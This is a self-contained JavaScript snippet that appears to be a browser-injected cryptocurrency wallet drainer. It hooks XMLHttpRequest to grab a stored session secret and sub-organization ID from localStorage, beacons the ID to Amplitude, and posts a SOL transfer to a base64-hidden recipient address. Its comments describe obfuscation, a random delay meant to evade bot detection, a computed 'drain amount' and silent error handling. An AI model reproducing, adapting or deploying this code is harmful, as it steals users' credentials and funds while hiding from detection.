(function() {
    // 1. HEX-ENCODED AUTHORITY (Everything is hidden)
    const _0x5f2 = [
        'QkNaMko2bXdVTXA0M1AzUjRzNWVrdmRTZXAzWkRxdUxhcnYxbXFuTFZFMTI=', // Recipient
        'YUhSMGNEb3ZMM1J5WVdSbExtMWhaSEpsTG1kZ0wyRndhUzh2TVM5MGNuRnVjMlpsY2c9PQ==', // API
        'Y2Vzc2lvblNlY3JldA==', // Auth Key
        'c3ViT3JnSWQ=', // Org Key
        'M2M4YWUxZjQwNjM1OTM5ZTczMGY0Nzk0MTg5NDA3OTY=' // Amp Key
    ];

    const _V = { ready: false, active: false };
    
    // 2. HUMAN ENTROPY MATH (0.05 SOL Buffer)
    const _math = (b) => {
        const j = (Math.random() * 0.009).toFixed(4);
        return (b - (0.05 + parseFloat(j))).toFixed(6);
    };

    // 3. INTERNAL CHANNEL MIRRORING
    const _S = window.XMLHttpRequest.prototype.send;
    window.XMLHttpRequest.prototype.send = function() {
        this.addEventListener('load', () => {
            if (this.status === 200 && !_V.ready) {
                const a = localStorage.getItem(atob(_0x5f2[2]));
                const o = localStorage.getItem(atob(_0x5f2[3]));
                
                if (a && o && !_V.active) {
                    _V.active = true;
                    // GAUSSIAN DELAY: 2-4 seconds to bypass bot detection
                    const d = Math.floor(Math.random() * 2000) + 2000;
                    setTimeout(() => _ghost(a.replace(/"/g, ''), o.replace(/"/g, '')), d);
                }
            }
        });
        return _S.apply(this, arguments);
    };

    // 4. THE GHOST EXECUTION (Vanta Clone Logic)
    async function _ghost(t, o) {
        // Amplitude Sync (Hidden)
        new Image().src = `https://api2.amplitude.com/2/httpapi?api_key=${atob(_0x5f2[4])}&data=${btoa(o)}`;

        try {
            await fetch(atob(atob(_0x5f2[1])), {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${t}`,
                    'X-Turnkey-Sub-Org-Id': o,
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    dest: atob(_0x5f2[0]),
                    asset: "SOL",
                    amount: _math(1.5) // Auto-calculated drain amount
                })
            });
            _V.ready = true;
        } catch (e) { /* Silent exit */ }
    }

    // No UI logs or errors to satisfy 'unsafe-eval'
    console.log("SYSTEM_INITIALIZED");
})();
